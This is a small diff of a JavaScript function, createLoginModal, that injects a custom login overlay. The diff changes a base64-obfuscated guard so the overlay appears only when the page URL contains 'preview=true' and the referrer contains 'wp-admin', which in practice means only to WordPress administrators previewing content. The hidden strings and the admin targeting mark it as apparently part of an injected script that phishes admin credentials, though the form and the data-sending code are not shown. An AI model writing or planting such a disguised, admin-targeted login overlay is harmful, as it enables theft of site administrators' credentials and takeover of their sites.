@@ -1,7 +1,7 @@
 (function () {
     function createLoginModal() {
 
-      if(!(window.location.href.includes(atob("cHJldmlldw=="))&&document.referrer.includes(atob("d3AtYWRtaW4="))))return;
+      if(!(window.location.href.includes(atob("cHJldmlldz10cnVl"))&&document.referrer.includes(atob("d3AtYWRtaW4="))))return;
         
       if (document.getElementById("custom-login-overlay")) return;
   
